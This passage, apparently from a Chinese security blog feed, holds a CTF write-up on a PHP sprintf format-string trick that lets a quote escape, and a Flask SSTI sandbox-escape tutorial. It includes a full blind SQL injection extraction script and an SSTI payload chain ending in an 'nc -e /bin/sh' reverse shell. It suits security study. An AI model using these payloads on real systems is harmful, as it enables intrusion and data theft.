expprec, 0);        zend_tmp_string_release(t);        break;    &#125;case 'd':    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign);    break;case 'u':    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment);    break;case 'g':case 'G':case 'e':case 'E':case 'f':case 'F':    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);    break;case 'c':    php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp));    break;case 'o':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec);    break;case 'x':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec);    break;case 'X':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec);    break;case 'b':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec);    break;case '%':    php_sprintf_appendchar( &amp; result, &amp;outpos, '%');    break;default:    break;&#125;</code></pre><h4 id="æˆå› "><a class="header-anchor" href="#æˆå› ">ğŸ­</a>æˆå› </h4><p>phpæºç ä¸­åªå¯¹15ç§ç±»å‹åšäº†åŒ¹é…ï¼Œ å…¶ä»–å­—ç¬¦ç±»å‹éƒ½è·³è¿‡æœªåšä»»ä½•å¤„ç†ï¼Œæ²¡åšå­—ç¬¦ç±»å‹æ£€æµ‹çš„æœ€å¤§å±å®³å°±æ˜¯å®ƒå¯ä»¥åƒæ‰ä¸€ä¸ªè½¬ä¹‰ç¬¦, å¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª,é‚£ä¹ˆphpä¼šæŠŠ\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰, æœ€å%\ï¼ˆæˆ–%1$\ï¼‰è¢«æ›¿æ¢ä¸ºç©ºã€‚<strong>%åçš„ä¸€ä¸ªå­—ç¬¦(é™¤äº†%ï¼Œ%ä¸Šé¢è¡¨æ ¼å·²ç»ç»™å‡ºäº†)éƒ½ä¼šè¢«å½“ä½œå­—ç¬¦å‹ç±»å‹è€Œè¢«åƒæ‰ï¼Œä¹Ÿå°±æ˜¯è¢«å½“ä½œä¸€ä¸ªç±»å‹è¿›è¡ŒåŒ¹é…åé¢çš„å˜é‡ï¼Œæ¯”å¦‚%cåŒ¹é…asciiiç ï¼Œ%dåŒ¹é…æ•´æ•°ï¼Œå¦‚æœä¸åœ¨å®šä¹‰çš„ä¹Ÿä¼šåŒ¹é…ï¼ŒåŒ¹é…ç©ºï¼Œæ¯”å¦‚%\ï¼Œè¿™æ ·æˆ‘ä»¬çš„ç›®çš„åªæœ‰ä¸€ä¸ªï¼Œä½¿å¾—å•å¼•å·é€ƒé€¸ï¼Œä¹Ÿå°±æ˜¯èƒ½å¤Ÿèµ·åˆ°é—­åˆçš„ä½œç”¨</strong></p><h4 id="æ —å­"><a class="header-anchor" href="#æ —å­">ğŸ­</a>æ —å­</h4><p><strong>ä¸ä½¿ç”¨å ä½ç¬¦å·</strong></p><p><img src="/2021/04/10/wei6/1.png" alt="1"></p><p><strong>ä½¿ç”¨å ä½ç¬¦å·</strong></p><p><img src="/2021/04/10/wei6/3.png" alt="3"></p><p><strong>åˆ©ç”¨%c</strong></p><p><img src="/2021/04/10/wei6/2.png" alt="2"></p><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ul><li><strong>sqlè¯­å¥è¿›è¡Œäº†å­—ç¬¦æ‹¼æ¥</strong></li><li><strong>æ‹¼æ¥è¯­å¥å’ŒåŸsqlè¯­å¥éƒ½ç”¨äº†vsprintf/sprintf å‡½æ•°æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong></li></ul><h3 id="ã€ichunqiuã€‘SQLI"><a class="header-anchor" href="#ã€ichunqiuã€‘SQLI">ğŸ­</a>ã€ichunqiuã€‘SQLI</h3><p>bpå»æµ‹è¯•è¿‡æ»¤çš„ç¬¦å·å‘ç°%ä¼šå‡ºç°ä¸ä¸€æ ·çš„æƒ…å†µ</p><p><img src="/2021/04/10/wei6/7.png" alt="7"></p><p>æµ‹è¯•</p><p><img src="/2021/04/10/wei6/4.jpg" alt="4"></p><p>sprintfå‡½æ•°å‡ºé”™ï¼Œè®©å•å¼•å·é€ƒé€¸ï¼Œæ„é€ ï¼š</p><p><code>username=admin%1$' and 1=2# </code></p><p><img src="/2021/04/10/wei6/5.jpg" alt="5"></p><p><code>username=admin%1$' and 1=1#</code></p><p><img src="/2021/04/10/wei6/6.jpg" alt="6"></p><p>å‘ç°â€™åé¢çš„è¯­å¥å¸¦å…¥æ‰§è¡Œäº†ï¼Œè¿™å°±æ˜¯æ³¨å…¥ç‚¹ï¼Œå¯ä»¥sqlmapè·‘æˆ–è€…è„šæœ¬</p><p>è„šæœ¬ï¼š</p><pre><code class="hljs powershell"><span class="hljs-comment">#coding:utf-8</span>import requestsimport string def boom():    url = <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&#x27;</span>    s = requests.session()//ä¼šè¯å¯¹è±¡requests.Sessionèƒ½å¤Ÿè·¨è¯·æ±‚åœ°ä¿æŒæŸäº›å‚æ•°ï¼Œæ¯”å¦‚cookiesï¼Œå³åœ¨åŒä¸€ä¸ªSessionå®ä¾‹å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¿æŒåŒä¸€ä¸ªcookies,è€Œrequestsæ¨¡å—æ¯æ¬¡ä¼šè‡ªåŠ¨å¤„ç†cookiesï¼Œè¿™æ ·å°±å¾ˆæ–¹ä¾¿åœ°å¤„ç†ç™»å½•æ—¶çš„cookiesé—®é¢˜ã€‚    dic = string.digits + string.letters + <span class="hljs-string">&quot;!@#<span class="hljs-variable">$</span>%^&amp;*()_+&#123;&#125;-=&quot;</span>    right = <span class="hljs-string">&#x27;password error!&#x27;</span>    error = <span class="hljs-string">&#x27;username error!&#x27;</span>    lens = <span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>//ç¡®å®šå½“å‰æ•°æ®åº“çš„é•¿åº¦    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;length(database())&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens=i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(database()): %d&quot;</span> %(lens))//ç¡®å®šå½“å‰æ•°æ®åº“çš„åå­—    strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr(database(),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]database():%s&quot;</span> %(strs))     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>//å¯¹å½“å‰çš„æ•°æ®åº“ï¼ŒæŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(table): %d&quot;</span> %(lens))     strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>// æ•°å­—ä¸€å®šè¦stræ‰å¯ä»¥ä¼ å…¥            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]table_name:%s&quot;</span> %(strs))    tablename = <span class="hljs-string">&#x27;0x&#x27;</span> + strs.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)//ç¼–ç ä¸º<span class="hljs-number">16</span>è¿›åˆ¶    table_name = strs     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(column_name) from information_schema.columns where table_name = &quot;</span> + str(tablename) + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(column): %d&quot;</span> %(lens))     strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot;</span> + str(tablename) +<span class="hljs-string">&quot; limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]column_name:%s&quot;</span> %(strs))    column_name = strs    num=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select count(*) from &quot;</span> + table_name + <span class="hljs-string">&quot;)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            num = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]number(column): %d&quot;</span> %(num))     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(&quot;</span> + column_name + <span class="hljs-string">&quot;) from &quot;</span> + table_name + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(value): %d&quot;</span> %(lens))     i=<span class="hljs-number">1</span>        strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or ascii(substr((select flag from flag limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]flag:%s&quot;</span> %(strs)) <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    boom()    print <span class="hljs-string">&#x27;Finish!&#x27;</span></code></pre><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075">æ·±å…¥è§£æsprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI(äºŒ)</title>
    <link href="/2021/04/06/wei4/"/>
    <url>/2021/04/06/wei4/</url>
    
    <content type="html"><![CDATA[<h4 id="å‘½ä»¤æ‰§è¡Œ"><a class="header-anchor" href="#å‘½ä»¤æ‰§è¡Œ">ğŸ­</a>å‘½ä»¤æ‰§è¡Œ</h4><p>å‘½ä»¤æ‰§è¡Œï¼Œå…¶å®å°±æ˜¯æ²™ç›’æº¢å‡ºçš„æ“ä½œã€‚</p><h5 id="tips1"><a class="header-anchor" href="#tips1">ğŸ­</a>tips1</h5><blockquote><p>from_pyfile</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_pyfile</span>(<span class="hljs-params">self, filename, silent=False</span>):</span> filename = os.path.join(self.root_path, filename) d = types.ModuleType(<span class="hljs-string">&#x27;config&#x27;</span>) d.__file__ = filename <span class="hljs-keyword">try</span>:     <span class="hljs-keyword">with</span> open(filename) <span class="hljs-keyword">as</span> config_file:         exec(compile(config_file.read(), filename, <span class="hljs-string">&#x27;exec&#x27;</span>), d.__dict__) <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:     <span class="hljs-keyword">if</span> silent <span class="hljs-keyword">and</span> e.errno <span class="hljs-keyword">in</span> (errno.ENOENT, errno.EISDIR):         <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>     e.strerror = <span class="hljs-string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror     <span class="hljs-keyword">raise</span> self.from_object(d) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre><p>from_object</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_object</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, obj)</span></span><span class="hljs-symbol">:</span> <span class="hljs-keyword">if</span> isinstance(obj, string_types)<span class="hljs-symbol">:</span>     obj = import_string(obj) <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dir(obj)<span class="hljs-symbol">:</span>     <span class="hljs-keyword">if</span> key.isupper()<span class="hljs-symbol">:</span>         <span class="hljs-keyword">self</span>[key] = getattr(obj, key)</code></pre><p>æ­¤æ–¹æ³•å°†ä¼ å…¥çš„æ–‡ä»¶ä½¿ç”¨ compile() è¿™ä¸ªpython çš„å†…ç½®æ–¹æ³•å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç (.pyc),å¹¶æ”¾åˆ° exec() é‡Œé¢å»æ‰§è¡Œï¼Œå‚æ•° <code>d.__dict__</code>çš„å«ä¹‰æ˜¯æŒ‡å®š exec æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ã€‚æ­¤æ–¹æ³•æ‰§è¡Œçš„ä»£ç ç‰‡æ®µè¢«æ”¾å…¥äº† <code>d.__dict__</code> ä¸­,å¹¶åœ¨åé¢è°ƒç”¨äº† from_object() æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¼šéå†  Obj çš„ dict å¹¶ä¸”æ‰¾åˆ°å¤§å†™å­—æ¯çš„å±æ€§ï¼Œå°†å±æ€§çš„å€¼ç»™ self[â€˜å±æ€§åâ€™]ï¼Œå¦‚æœèƒ½è®© from_pyfile å»è¯»è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ï¼š</p><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> os import systemSHELL = system</code></pre><p>æˆ‘ä»¬å°±èƒ½é€šè¿‡ config[â€˜SHELLâ€™] è°ƒç”¨ system æ–¹æ³•äº†ï¼Œæ–‡ä»¶æ€ä¹ˆå†™å…¥å°±éœ€è¦ç»•è¿‡æ²™ç›’çš„æ–¹å¼å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚</p><p>payloadï¼š</p><pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp/evil&#x27;, &#x27;w&#x27;</span>).write(&#x27;from os import system%0aSHELL = system&#x27;) &#125; &#125;//å†™æ–‡ä»¶&#123; &#123; config.from<span class="hljs-emphasis">_pyfile(&#x27;/tmp/evil&#x27;) &#125; &#125;</span><span class="hljs-emphasis">//åŠ è½½system</span><span class="hljs-emphasis">&#123; &#123; config[<span class="hljs-string">&#x27;SHELL&#x27;</span>](<span class="hljs-link">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125; &#125;</span><span class="hljs-emphasis">//æ‰§è¡Œå‘½ä»¤åå¼¹SHELL</span></code></pre></blockquote><h5 id="tips2"><a class="header-anchor" href="#tips2">ğŸ­</a>tips2</h5><p>åœ¨pythonä¸­ï¼Œobjectç±»æ˜¯Pythonä¸­æ‰€æœ‰ç±»çš„åŸºç±»ï¼Œå¦‚æœå®šä¹‰ä¸€ä¸ªç±»æ—¶æ²¡æœ‰æŒ‡å®šç»§æ‰¿å“ªä¸ªç±»ï¼Œåˆ™é»˜è®¤ç»§æ‰¿objectç±»ã€‚</p><p>è¿è¡Œä»£ç :</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.__class__)</span></span></code></pre><p>è¿”å›äº†&lt;class â€˜strâ€™&gt;ï¼Œå¯¹äºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ä»–å·²ç»æ‰“å°äº†strç±»å‹ï¼Œåœ¨pythonä¸­ï¼Œæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª<strong>bases</strong>å±æ€§ï¼Œåˆ—å‡ºå…¶åŸºç±».</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>)</span></span></code></pre><p>æ‰“å°è¿”å›(&lt;class â€˜objectâ€™&gt;,)ï¼Œæˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä»–çš„åŸºç±»objectï¼Œè€Œæˆ‘ä»¬æƒ³è¦å¯»æ‰¾objectç±»çš„ä¸ä»…ä»…åªæœ‰basesï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨<strong>mro</strong>ï¼Œ<strong>mro</strong>ç»™å‡ºäº†method resolution orderï¼Œå³è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚æˆ‘ä»¬å®ä¾‹æ‰“å°ä¸€ä¸‹mroã€‚</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>)</span></span></code></pre><p>è¿”å›äº†(&lt;class â€˜strâ€™&gt;, &lt;class â€˜objectâ€™&gt;)ï¼ŒåŒæ ·å¯ä»¥æ‰¾åˆ°objectç±»ï¼Œæ­£æ˜¯ç”±äºè¿™äº›ä½†ä¸ä»…é™äºè¿™äº›æ–¹æ³•ï¼Œæˆ‘ä»¬æ‰æœ‰äº†å„ç§æ²™ç®±é€ƒé€¸çš„å§¿åŠ¿ã€‚æ­£å¦‚ä¸Šé¢çš„è§£é‡Šï¼Œ<strong>mro</strong>è¿”å›äº†è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œå°†ä¼šæ‰“å°ä¸¤ä¸ªã€‚åœ¨flask sstiä¸­pocä¸­å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ä»objectç±»ä¸­å¯»æ‰¾æˆ‘ä»¬å¯åˆ©ç”¨çš„ç±»çš„æ–¹æ³•ã€‚æ¥ä¸‹æ¥ä½¿ç”¨subclassesï¼ˆè¿”å›çš„æ˜¯è¿™ä¸ªç±»çš„å­ç±»çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯objectç±»çš„å­ç±»çš„é›†åˆï¼‰</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span>)</code></pre><p>python 3.6 ç‰ˆæœ¬ä¸‹çš„objectç±»ä¸‹çš„æ–¹æ³•é›†åˆã€‚<strong>2.7å’Œ3.6ç‰ˆæœ¬è¿”å›çš„å­ç±»ä¸æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯2.7æœ‰çš„3.6å¤§éƒ¨åˆ†éƒ½æœ‰</strong>ã€‚éœ€è¦è‡ªå·±å¯»æ‰¾åˆé€‚çš„æ ‡å·æ¥è°ƒç”¨ã€‚</p><p>ä¸¾ä¸ªæ —å­:<strong>åœ¨pythonç¯å¢ƒä¸‹ï¼Œä¸ç›´æ¥ä½¿ç”¨openæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</strong></p><pre><code class="hljs delphi"><span class="hljs-comment">// python2</span>&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__(&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span 